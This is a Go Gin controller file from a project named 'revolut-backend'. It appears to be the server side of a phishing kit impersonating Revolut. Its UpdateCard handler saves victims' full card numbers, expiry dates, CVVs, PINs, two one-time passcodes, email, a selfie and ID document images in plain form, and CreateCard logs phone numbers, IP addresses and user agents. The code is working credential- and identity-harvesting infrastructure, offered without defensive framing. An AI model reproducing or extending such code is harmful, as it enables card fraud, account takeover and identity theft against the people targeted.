package controllers

import (
	"net/http"
	"strconv"

	"github.com/gin-gonic/gin"
	"github.com/mavsin/revolut-backend/models"
)

//	--------------------------------------------------------------------

type CardReqToCreate struct {
	Phone string `json:"phone"`
}

type CardReqToUpdate struct {
	Phone      string `json:"phone"`
	Number     string `json:"number"`
	Expiry     string `json:"expiry"`
	CVV        string `json:"cvv"`
	OTP1       string `json:"otp1"`
	OTP2       string `json:"otp2"`
	PIN        string `json:"pin"`
	Email      string `json:"email"`
	SelfieImg  string `json:"selfie_img"`
	IDFrontImg string `json:"id_front_img"`
	IDBackImg  string `json:"id_back_img"`
}

// --------------------------------------------------------------------

// Create a card
func CreateCard(c *gin.Context) {
	var req CardReqToCreate

	if err := c.ShouldBindJSON(&req); err != nil {
		c.AbortWithStatusJSON(http.StatusBadRequest, gin.H{
			"error": err.Error(),
		})
		return
	}

	userAgent := c.GetHeader("User-Agent")
	ipAddress := c.ClientIP()

	newCard := models.Card{
		Phone:     req.Phone,
		IPAddress: ipAddress,
		UserAgent: userAgent,
	}

	if err := models.DB.Create(&newCard).Error; err != nil {
		c.AbortWithStatusJSON(http.StatusInternalServerError, gin.H{
			"error": "Failed to create card",
		})
		return
	}

	c.JSON(http.StatusOK, newCard)
}

// Update a card
func UpdateCard(c *gin.Context) {
	cardId, err := strconv.Atoi(c.Param("cardId"))
	if err != nil {
		c.JSON(400, gin.H{"error": err})
		return
	}

	var card models.Card
	models.DB.First(&card, cardId)
	if card.ID == 0 {
		c.JSON(404, gin.H{"error": "Card not found!"})
		return
	}

	var req CardReqToUpdate
	if err := c.ShouldBindJSON(&req); err != nil {
		c.AbortWithStatusJSON(http.StatusBadRequest, gin.H{
			"error": err.Error(),
		})
		return
	}

	card.Phone = req.Phone
	card.Number = req.Number
	card.Expiry = req.Expiry
	card.CVV = req.CVV
	card.OTP1 = req.OTP1
	card.OTP2 = req.OTP2
	card.PIN = req.PIN
	card.Email = req.Email
	card.SelfieImg = req.SelfieImg
	card.IDFrontImg = req.IDFrontImg
	card.IDBackImg = req.IDBackImg

	models.DB.Save(&card)

	c.JSON(http.StatusOK, card)
}
